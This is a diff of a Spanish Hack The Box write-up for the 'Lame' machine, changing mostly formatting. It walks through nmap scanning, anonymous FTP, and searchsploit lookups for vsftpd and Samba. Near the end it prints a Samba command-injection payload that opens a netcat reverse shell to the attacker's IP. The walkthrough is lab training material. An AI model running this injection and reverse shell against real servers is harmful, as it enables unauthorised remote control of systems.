@@ -30,7 +30,7 @@ En caso de tener problemas al hacer la fase de reconocimiento con nmap puede ser
 sudo service opensnitch stop
 ```
 
-Vamos a ver los puertos abiertos con el comando **sudo nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.3** obteniendo lo siguiente:
+Vamos a ver los puertos abiertos con el comando ***sudo nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.3*** obteniendo lo siguiente:
 
 ```go
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -64,7 +64,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
            Raw packets sent: 131083 (5.768MB) | Rcvd: 23 (1.012KB)
 ```
 
-Lo anterior quedo guardado en el archivo **allports**:
+Lo anterior quedo guardado en el archivo ***allports***:
 
 ```bash
 # Nmap 7.92 scan initiated Sat Jan  8 17:08:04 2022 as: nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.3
@@ -74,7 +74,7 @@ Host: 10.10.10.3 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tc
 # Nmap done at Sat Jan  8 17:08:30 2022 -- 1 IP address (1 host up) scanned in 26.52 seconds
 ``` 
 
-Ahora, para esos puertos abiertos, veremos la versión y servicio que corren por ahí con **sudo nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted** que nos arroja:
+Ahora, para esos puertos abiertos, veremos la versión y servicio que corren por ahí con ***sudo nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted*** que nos arroja:
 
 ```bash
 # Nmap 7.92 scan initiated Sat Jan  8 17:19:52 2022 as: nmap -sCV -p21,22,139,445,3632 -oN targered 10.10.10.3
@@ -98,7 +98,7 @@ PORT     STATE SERVICE     VERSION
 |_End of status
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 | ssh-hostkey: 
-|   1024 6:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
@@ -131,11 +131,11 @@ Vemos algo interesante del anterior resultado. Podemos ingresar con usuario anon
   <img src="../assets/images/htb-writeup-lame/anonymous-permitido.png">
 </p>
 
-Para conectarnos al ftp debemos verificar que tenemos el cliente de ftp. En mi caso debo instalarlo con **sudo apt-get install ftp**
+Para conectarnos al ftp debemos verificar que tenemos el cliente de ftp. En mi caso debo instalarlo con ***sudo apt-get install ftp***
 
 <br>
 
-Nos conectamos con **ftp 10.10.10.3** (contraseña nula) y obtenemos:
+Nos conectamos con ***ftp 10.10.10.3*** (contraseña nula) y obtenemos:
 
 ```bash
 Connected to 10.10.10.3.
@@ -161,11 +161,11 @@ En otra terminal vamos a ver que vulnerabilidades conocidas tiene el servicio vs
 sudo apt update && sudo apt -y install exploitdb 
 ```
 
-Una vez instalado, actualizamos la base de datos de este programa con **searchsploit -u** (aunque se debe realizar automáticamente, pero por si las moscas).
+Una vez instalado, actualizamos la base de datos de este programa con ***searchsploit -u*** (aunque se debe realizar automáticamente, pero por si las moscas).
 
 <br>
 
-Con el comando **searchsploit vsftpd** vemos las vulnerabilidades:
+Con el comando ***searchsploit vsftpd*** vemos las vulnerabilidades:
 
 ```bash
 ----------------------------------------------------------------------------------------------------- ---------------------------------
@@ -183,7 +183,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-Existe vulnerabilidad para la versión **vsftpd 2.3.4**. También en Github podemos encontrar un programa que explota esta vulnerabilidad: [Hellsender01 / vsftpd_2.3.4_Exploit ] (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit) la cual consta de poner una carita feliz **:)** al final del usuario ftp, pero no funciona , como se muestra a continuación:
+Existe vulnerabilidad para la versión ***vsftpd 2.3.4***. También en Github podemos encontrar un programa que explota esta vulnerabilidad: [Hellsender01 / vsftpd_2.3.4_Exploit ] (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit) la cual consta de poner una carita feliz ***:)*** al final del usuario ftp, pero no funciona , como se muestra a continuación:
 
 <p align="center">
   <img src="../assets/images/htb-writeup-lame/vulnerabilidad-ftp-no-funciona.png">
@@ -197,18 +197,18 @@ Intentaremos ver vulnerabilidades en el servicio samba, pero antes ¿que es el s
   <img src="../assets/images/htb-writeup-lame/grafico-samba.png">
 </p>
 
-Samba es una suite de aplicaciones Unix que habla el protocolo **SMB** (Server Message Block). Los sistemas operativos Microsoft Windows y OS/2 utilizan SMB para compartir por red archivos e impresoras y para realizar tareas asociadas. Gracias al soporte de este protocolo, Samba permite a las máquinas Unix entrar en el juego, comunicándose con el mismo protocolo de red que Microsoft Windows y aparecer como otro sistema Windows en la red (desde la perspectiva de un cliente Windows). El servidor Samba ofrece los siguientes servicios: 
-    • Compartir uno o varios sistemas de archivos
-    • Compartir uno o varios sistemas de archivos distribuidos
-    • Compartir impresoras instaladas en el servidor entre los clientes Windows de la red
-    • Ayudar a los clientes permitiéndoles navegar por la red
-    • Autentificar a los clientes que ingresan en un dominio Windows
-    • Proveer o ayudar con un servidor de resolución de nombres Windows (WINS) 
+Samba es una suite de aplicaciones Unix que habla el protocolo ***SMB*** (Server Message Block). Los sistemas operativos Microsoft Windows y OS/2 utilizan SMB para compartir por red archivos e impresoras y para realizar tareas asociadas. Gracias al soporte de este protocolo, Samba permite a las máquinas Unix entrar en el juego, comunicándose con el mismo protocolo de red que Microsoft Windows y aparecer como otro sistema Windows en la red (desde la perspectiva de un cliente Windows). El servidor Samba ofrece los siguientes servicios: 
+- Compartir uno o varios sistemas de archivos
+- Compartir uno o varios sistemas de archivos distribuidos
+- Compartir impresoras instaladas en el servidor entre los clientes Windows de la red
+- Ayudar a los clientes permitiéndoles navegar por la red
+- Autentificar a los clientes que ingresan en un dominio Windows
+- Proveer o ayudar con un servidor de resolución de nombres Windows (WINS) 
 Fuente: [https://www.sergio-gonzalez.com/doc/10-ldap-samba-cups-pykota/html/samba-que-es.html](https://www.sergio-gonzalez.com/doc/10-ldap-samba-cups-pykota/html/samba-que-es.html) 
 
 <br>
 
-Vulnerabilidades en samba con **searchsploit samba 3.0.20** :
+Vulnerabilidades en samba con ***searchsploit samba 3.0.20*** :
 
 ```bash
 ----------------------------------------------------------------------------------------------------- ---------------------------------
@@ -224,13 +224,13 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-Vamos a ver una de estas vulnerabilidades imprimiendo el código del programa que explota la vulnerabilidad con el comando **searchsploit -x unix/remote/16320.rb**:
+Vamos a ver una de estas vulnerabilidades imprimiendo el código del programa que explota la vulnerabilidad con el comando ***searchsploit -x unix/remote/16320.rb***:
 
 <p align="center">
   <img src="../assets/images/htb-writeup-lame/codigo-vulnerabilidad.png">
 </p>
 
-Es necesario [smbclient](https://www.computerhope.com/unix/smbclien.htm) para interactuar con el servidor SMB. Vamos a listar los recursos compartidos con **mbclient -L 10.10.10.3 -N --option="client min protocol=NT1"** ([ver](https://askubuntu.com/questions/1341049/samba-min-protocol-smb3-nmap-report-smbv1)) y obtenemos:
+Es necesario [smbclient](https://www.computerhope.com/unix/smbclien.htm) para interactuar con el servidor SMB. Vamos a listar los recursos compartidos con ***mbclient -L 10.10.10.3 -N --option="client min protocol=NT1"*** ([ver](https://askubuntu.com/questions/1341049/samba-min-protocol-smb3-nmap-report-smbv1)) y obtenemos:
 
 ```go
 Anonymous login successful
@@ -253,13 +253,13 @@ Anonymous login successful
 	WORKGROUP            LAME
 ```
 
-Para ver específicamente un recurso compartido a nivel de red (el tmp) con **smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1"** y obtenemos:
+Para ver específicamente un recurso compartido a nivel de red (el tmp) con ***smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1"*** y obtenemos:
 
 <p align="center">
   <img src="../assets/images/htb-writeup-lame/smbclient-ls.png">
 </p>
 
-Intentamos ejecución de comandos remota como vimos anteriormente con **smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=` nohup nc -e /bin/bash 10.10.14.12 443` " '** :
+Intentamos ejecución de comandos remota como vimos anteriormente con ***smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=` nohup nc -e /bin/bash 10.10.14.12 443` " '*** :
 
 <p align="center">
   <img src="../assets/images/htb-writeup-lame/explotacion-vulnerabilidad.png">
@@ -288,4 +288,4 @@ Exploramos un poquito, y finalmente obtenemos las flags (ya somos root):
 
 <br>
 
-Fuente: [https://www.youtube.com/watch?v=MNJi4k9uNKQ](https://www.youtube.com/watch?v=MNJi4k9uNKQ)0
+Fuente: [https://www.youtube.com/watch?v=MNJi4k9uNKQ](https://www.youtube.com/watch?v=MNJi4k9uNKQ)
